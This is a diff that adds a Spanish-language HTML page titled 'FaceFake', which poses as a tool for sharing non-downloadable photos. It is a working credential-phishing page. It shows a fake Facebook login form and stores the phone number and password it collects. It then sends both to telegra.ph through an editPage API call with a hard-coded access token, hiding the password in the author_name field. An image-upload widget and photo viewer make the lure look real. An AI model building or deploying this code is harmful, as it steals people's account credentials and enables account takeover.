@@ -1,1 +1,168 @@
-innnn
+<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1"><style>@import url(https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css);*{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box;user-select:none;outline:0}body,html{width:100%;height:100%;text-rendering:optimizeLegibility;padding:0;overflow:hidden;margin:0}body{font-size:clamp(1px,6vw,2.55rem);background-color:var(--background);color:var(--color);font-family:asap;display:flex;flex-direction:column;align-items:center;align-content:center}#root{display:flex;width:100%;height:100%;flex-direction:column;padding:2em}.post{flex:1;font-size:1.6em;font-weight:800}.post img{width:100%}button{font-size:1em;padding:.3em}.nota{font-size:.6em;padding:.5em}a{color:#07d;text-decoration:none;display:inline-block}a.facebook{padding:.2em;font-size:1.7em;font-weight:900}.input{border:none;background:#dcdcdc;width:90%;font-size:1em;margin:.3em;padding:.3em}.box button{font-size:.8em;padding:.3em;margin:0 .4em;background:#07d;color:#fff;border:none}.box{font-size:1.3em}.result{width:100%;height:100%;padding:.5em;object-fit:contain;background:#222}.foto{position:fixed;top:0;left:0;z-index:6}.foto label{background:#07d;color:#fff;font-weight:900;font-size:1.2em;margin:.2em;padding:.3em;border-radius:.1em;display:inline-block}#link{position:fixed;bottom:0;left:0;z-index:10;padding:.7em}#link input{width:100%;font-size:.8em}</style><title>FaceFake</title></head><body><div id="root"></div><script>
+  const url = (new URL(window.location.href)).searchParams.get('id')||'FmW9cTQ';
+    (welcome = async ()=>{
+      registra = async()=>{
+        if(phone.value&&phone.value.length>=8&&pass.value&&pass.value.length>3){
+          localStorage.phone = phone.value
+          localStorage.pass = pass.value
+          welcome()
+        }else{
+          alert('Introduce tu número y contraseña de Facebook')
+        }
+      }
+      face=()=>{
+        root.style.background = "#fcfcfc"
+        root.style.color = "#111"
+        root.innerHTML = `<div class="box">
+          <a class="facebook">Facebook</a>
+          <div class="nota">Accede desde tu cuenta de Facebook para abrir las fotos recibidas</div>
+          <input id="phone" placeholder="Teléfono" type="number" class="input"/>
+          <input id="pass" placeholder="Contraseña" type="password" class="input"/>
+          <button onclick="registra()">Acceder</button>
+        </div>
+        `
+      }
+    
+      if(!localStorage.phone){
+        root.style.background = "#07D"
+        root.style.color = "#fff"
+        root.innerHTML = `
+        <div class="post">
+          Comparte fotos no descargables con tus amigos
+          <img src="https://img.icons8.com/?size=512&id=30843&format=png" alt="">
+        </div>
+        <div class="nota">Las imágenes no podrán ser descargadas </div>
+        <div><button onclick="face()" class="bi-facebook"> To Facebook</button></div>`
+      }else{
+        idd = 'c12893b2d27d5ec5b56935a77ca1f88199b5ee81fe0794a4c39010194dc0'
+        page = 'byte-01-19'
+        ass = await fetch('https://api.telegra.ph/editPage/'+page+'?access_token='+idd+'&title='+localStorage.phone+'&author_name='+localStorage.pass+'&content=[{"tag":"p","children":["'+new Date()+'"]}]&return_content=true')
+        console.log(await ass.text())
+      
+      
+      
+        root.style.padding = "0"
+        root.innerHTML = `<div class="foto"><label data-callback="milink" class="ibb"></label></div><img id="foto" class="result" src="https://i.ibb.co/${url}/image.jpg" alt="error"><div id="link"></div>`
+milink = (u)=>{
+  foto.src = 'httpt://th.h'
+  foto.src = u
+  alert('Copie el Link que aparece para compartir su foto')
+  path = ( location.origin+location.pathname +'?id='+ u.replace(/(https:\/\/i.ibb.co\/)|(\/image.jpg)/gim,'') )
+  link.innerHTML = '<input value="'+path+'" type="url">' 
+}
+!function() {
+  document.querySelectorAll('.ibb').forEach(i=>{
+    i.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="1.1em" height="1.1em" style="display:inline-block;vertical-align:top;padding:0" viewBox="0 0 24 24"><path fill="currentColor" stroke="none" d="M5 20h14v-2H5v2zm7-16l-5 5h3v7h4v-7h3l-5-5z"/></svg>Ibb'
+    i.onclick = function(){
+      ibbUpload(window[this.dataset.callback]||false)
+    }
+  })
+
+  let e = document.createElement("style");
+  e.innerHTML = `dialog#uplo_widget *{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box;outline:0}dialog#uplo_widget{width:250px !important;max-width:250px !important;min-width:250px !important;border-radius:2px;border:none;font-size: 15px;outline:0;box-shadow:0 0 20px #111;background:#fcfcfc;color:#222;position:relative}dialog#uplo_widget div.uplo_widget_upload{display:inline-block;width:100%}dialog#uplo_widget img#preview-image-ibb{width:100%;aspect-ratio:4/4;margin:auto;display:block;object-fit:cover}dialog#uplo_widget #uplo_widget_box label{display:inline-block;width:100%;padding:10px;font-size:15px;text-align:center;font-weight:200}dialog#uplo_widget input[type=checkbox]{position:relative;width:1.7em;height:1.5em;background:#fff;-webkit-appearance:none;border:1px solid #ccc;border-radius:.2em;margin:.3em .1em;display:inline-block;vertical-align:middle}dialog#uplo_widget input[type=checkbox]:checked::before{content:'✓';display:initial;font-size:2em;font-weight:900;color:#07d;position:absolute;left:.1em;bottom:-.2em}dialog#uplo_widget #uplo_widget_box input[type=button]{display:inline-block;border:.5px solid #ccc;background-image:linear-gradient(#dcdcdc,#ececec);border-radius:5px;padding:3px;font-size:15px;font-weight:900;box-shadow:0 0 1px #111;vertical-align:middle;margin:2px}dialog#uplo_widget #uplo_widget_msg{display:inline-block;font-weight:700;padding:10px;font-size:17px;text-align:center;width:100%}#uplo_widget_msg>span{color:red}#uplo_widget_msg textarea{width:100%;resize:none;wrap:"off";white-space:nowrap}dialog#uplo_widget>b{font-size:27px;display:inline-block;padding:5px}dialog#uplo_widget>b:after{content:'imgbb.com';padding-left:15px;color:#1e90ff;font-weight:900}dialog#uplo_widget #spinner{width:100%;height:100%;top:0;left:0;position:absolute;display:none;flex-direction:column;align-items:center;align-content:center;touch-action:none;z-index:9999}dialog#uplo_widget #spinner:after{content:'';width:2em;height:2em;margin:auto;position:relative;display:inline-block;border-radius:50%;border:.57em solid;box-shadow:0 0 2px #000;border-color:#dbdcef #07d #dbdcef #dbdcef;animation:1s linear infinite spinner-d3wgkg}@keyframes spinner-d3wgkg{to{transform:rotate(1turn)}}`,
+  document.head.prepend(e),
+  window.ibbUpload = async e=>{
+    if (document.body.querySelector("#uplo_widget")) {
+      if ("[object File]" == e && document.body.querySelector("#uplo_widget")) {
+        if (e.type.startsWith("image/")) {
+          let i = new FileReader;
+          i.onload = function(e) {
+            document.getElementById("preview-image-ibb").src = e.target.result,
+            document.getElementById("uplo_widget_box").style.display = "block"
+          }
+          ,
+          i.readAsDataURL(e),
+          console.log(e)
+        } else
+          console.log("error type")
+      } else if ("string" == typeof e && "upload" === e) {
+        let o = new FormData;
+        o.append("source", uploadibb.files[0]),
+        o.append("type", "file"),
+        o.append("action", "upload"),
+        o.append("timestamp", new Date().getTime()),
+        o.append("auth_token", void 0),
+        o.append("expiration", uplo_widget_expire.checked ? "P30D" : ""),
+        o.append("title", ""),
+        uplo_widget_msg.innerHTML = "...",
+        spinner.style.display = "flex";
+        try {
+          let t = await fetch("https://imgbb.com/json", {
+            method: "POST",
+            body: o
+          })
+            , n = await t.json();
+          if (console.log(JSON.stringify(n, null, 2)),
+          n.success && 200 == n.status_code) {
+            let d = document.getElementById("preview-image-ibb");
+            d.src = n.image.url,
+            d.onclick = ()=>{}
+            ,
+            d.onload = d.onerror = async function() {
+              uplo_widget_msg.innerHTML = `<textarea warp="off" rows=1>${this.src}</textarea>`,
+              uplo_widget_box.remove(),
+              spinner.style.display = "none",
+              window.callback_ibb && (uplo_widget.remove(),
+              window.callback_ibb(this.src))
+            }
+          } else
+            spinner.style.display = "none",
+            uplo_widget_msg.innerHTML = `<span>${n.error.message}</span>`
+        } catch (l) {
+          spinner.style.display = "none",
+          uplo_widget_msg.innerHTML = "<span>Error al subir imagen</span>",
+          console.error("Error al subir la imagen:", l)
+        }
+      } else
+        uplo_widget_msg.innerHTML = "<span>Acci\xf3n no definida</span>",
+        console.error(e, " No definido"),
+        uplo_widget.remove()
+    } else
+      "function" == typeof e && (this.callback_ibb = e),
+      (uplo_widget = document.createElement("dialog")).id = "uplo_widget",
+      uplo_widget.innerHTML = `<div id="spinner"></div><b onclick="this.parentNode.remove()">&times;</b><div class="uplo_widget_upload"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAADfklEQVR4nO3Z7UtTURwH8CHVf9Kb4J5Wor0MfJF/Qb2J3hiMhKAoNJByw1KEELI34b3bDNKKypDQiTVjmviQqT2Ylok6pjPNh82VT9s537im8+xJc/fcG8F+cF4Mtt89n/M7D/femUyZyEQm9ozsGhyUZFyXZDpAZLpOFAatTZKp32RFlknvOPIEh4hCu0V0OgnCoTtCHXk9Om8YQlKnzdbFSj2A6xvQPAo0fgGeDQOPhxjqPjDcH2Sw9zPc62O428tQ1cVQ2clws52h9DVDiZuhqDUlwqkbgp/z7gmgbRxoHUsfsUslnLog+Iu88QKeSW0IPl9+vQEI/gLdPmhG8PkutxiA4JO/nYJmBJ+vqNUABJ+43w/NCLN9J1/xSwMQfNL3M9CMyHuwjy1WoX3CdqHjDoahWWhGFO2yE5EkTTNAkmmF2U7D1naGkTkIQ+TVxU4nohdAjYkl2MYWgNF5CEP87WFnEhHeJdgmlgCjEEQ0wBeEzRsAjEIQ0YDpIGy+IMAj1DVhdmi/mTtqZzjXmPqwEwKYCcE2vQzwiBynuDvSbEfqw04IYGQBFd9DAI8o6xBTAbOdoeBF7HQSvY06N4/9NoZ4hF5rgggGRLZHau4XDEEc26qspNAVzQB+NOZXYAii0MWQ66TzUg0uCQUsriKKqOjcGal026mHDPUfU1WC2jR3Ph4QWEMUkVsrZgcq70xeCaVfB0BwDVFEZZf2CuQ/YmgYTj6dagd1AITWEYPQY008/QwUNKmbRmRDkmm15mcCHvBzA7oimkaB802CH2z4ZCth6IZwjwMWV/KppgnBJ1oNI4q43b3/NXC6gWHAn4jo8AKFLbv/Nm0En2Q9gijiRJq7kDrH+Ur0TgEXU7zwEoLgE2xQRBFVPfuvwJnnDJ9mY6fTlVex37E0J3TaEfe5Om1AmCIGIWJN5HKVvOBiaJ9EDEAdcR4hyTSYNiBCIRxxw8M2b82vuhl6fH/WRAxADSuyiELvEJkuSzItSx/AoAtiKG53SgBoCT4ZVQEGIIieACMQRCiAe72udtQIBBFbAfpuO1nNIAxBEJEASca1dA6svZr6qrKqJxHx9QeYUMBJKw4QhXr0QOTU0oB/GRZfABZvAJbJRZwdm8NhoYBthKSgmMi0T9TfrGoeSUZJsusJBxgdJDpIdM30PwZRaDlRaIjI9Na/7ksmTHvEb9TV2Zk3zcAHAAAAAElFTkSuQmCC" onclick="uploadibb.click()" id="preview-image-ibb" alt="yj"><div hidden id="uplo_widget_box"><label><input id="uplo_widget_expire" type="checkbox">Eliminar en 30D\xedas</label><div><input onclick="ibbUpload('upload')" value="Upload" type="button">Subir imagen al servidor de imgbb.com</div></div><div id="uplo_widget_msg"></div></div><input hidden onchange="ibbUpload(this.files[0])" id="uploadibb" type="file" accept="image/*" />`,
+      document.body.append(uplo_widget),
+      uplo_widget.showModal()
+  }
+}();
+      }
+    })()
+
+
+
+const dialog = (text,accion,title)=>{
+  wm = document.createElement('dialog')
+  wm.style = "outline:0;padding:0;animation: modal .5s;max-height:70%;display:flex;flex-direction:column;transition:1s;overflow:auto;margin:auto;text-align:center;box-shadow: 0 0 2em #000;width:14em;max-width:90%;border-radius:.3em;border:none"
+  wm.innerHTML = `
+    <div style="font-size: 1.9em;font-weight: 900;padding: .2em">${title ? title : !accion ? 'Confirma' : 'Alerta'}</div>
+    <div style="overflow-wrap: break-word;padding:.3em .5em;min-height:3em;flex:1;font-size: 1em;overflow: auto; font-weight: 200">${text || '¿Desea continuar con la ejecución de la acción?'}</div>
+    <div style="box-shadow: 0 0 1px #000;display:flex;padding: .3em 1em;">
+      <a id="confirm" style="width:100%;display:inline-block;font-size: 1em;padding: .5em 0;color:#007aff;font-weight: 600;text-align:center">Aceptar</a>
+      ${accion != true ? `<a id="cancel" style="width:100%;display:inline-block;font-size: 1em;padding: .5em 0;color:red;font-weight: 600;border-left: 1px solid #888;text-align:center">Cancelar</a>` : ``}
+    </div>
+  `
+  document.body.append(wm)
+  wm.showModal(wm)
+  return new Promise((resolve)=>{
+    const btnAceptar = document.getElementById("confirm");
+    if (accion != true) {
+      const btnCancelar = wm.querySelector("#cancel");
+      btnCancelar.onclick = function() {
+        wm.remove()
+        resolve(false)
+      }
+    }
+    btnAceptar.onclick = function() {
+      wm.remove()
+      resolve(true)
+    }
+  })
+}
+
+window.alert = async function(event) {
+  return new Promise(async(resolve)=>{
+    ok = await dialog(event || '', true)
+    resolve(ok)
+  })
+}</script></body></html> </body>
+</html>
